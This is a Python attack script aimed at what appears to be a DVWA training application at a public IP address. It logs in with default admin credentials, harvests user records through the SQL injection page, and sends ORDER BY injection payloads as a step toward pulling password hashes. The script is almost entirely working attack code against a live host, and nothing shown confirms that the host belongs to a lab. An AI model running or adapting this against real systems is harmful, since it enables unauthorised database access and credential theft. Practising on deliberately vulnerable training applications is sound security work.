
import requests
import re
import time

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] Using blind SQL injection to extract user data...")
    print("[*] Since we can query individual users by ID, let's extract all user data systematically...\n")
    
    # We already know there are 5 users (IDs 1-5)
    # Let's extract their data properly
    all_users = []
    
    # First, let's check each user individually
    for user_id in range(1, 6):
        print(f"\n[*] Querying user ID: {user_id}")
        
        params = {
            "id": str(user_id),
            "Submit": "Submit"
        }
        
        response = session.get(sqli_url, params=params, timeout=10)
        
        # Extract the pre section with user data
        pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
        if pre_match:
            pre_content = pre_match.group(1)
            # Convert HTML breaks to newlines
            pre_content = pre_content.replace('<br />', '\n')
            print(f"[+] Raw data:\n{pre_content}")
            
            # Extract structured data
            id_match = re.search(r'ID: (\d+)', pre_content)
            fn_match = re.search(r'First name: ([^<\n]+)', pre_content)
            sn_match = re.search(r'Surname: ([^<\n]+)', pre_content)
            
            user_dict = {}
            if id_match:
                user_dict['id'] = id_match.group(1)
            if fn_match:
                user_dict['first_name'] = fn_match.group(1).strip()
            if sn_match:
                user_dict['surname'] = sn_match.group(1).strip()
            
            if user_dict:
                all_users.append(user_dict)
                print(f"[+] Extracted: {user_dict}")
    
    print(f"\n\n[+] SUMMARY: Extracted {len(all_users)} users:")
    for user in all_users:
        print(f"  - {user}")
    
    # Now let's try blind SQL injection to extract password hashes
    # We'll use the CAST or similar techniques to make characters visible
    print("\n\n[*] Attempting to extract password hashes using advanced SQLi techniques...")
    
    # Try time-based blind SQL injection
    print("\n[*] Testing advanced SQLi payloads...")
    
    advanced_payloads = [
        # Try using ORDER BY to find number of columns
        ("1 ORDER BY 1--", "Order by 1"),
        ("1 ORDER BY 2--", "Order by 2"),
        ("1 ORDER BY 3--", "Order by 3"),
        ("1 ORDER BY 4--", "Order by 4"),
        ("1 ORDER BY 5--", "Order by 5"),
    ]
    
    for payload, desc in advanced_payloads:
        print(f"\n[*] Testing: {desc} - {payload}")
        params = {"id": payload, "Submit": "Submit"}
        response = session.get(sqli_url, params=params, timeout=10)
        
        pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
        if pre_match:
            content = pre_match.group(1)[:200]
            print(f"[+] Response: {content}")


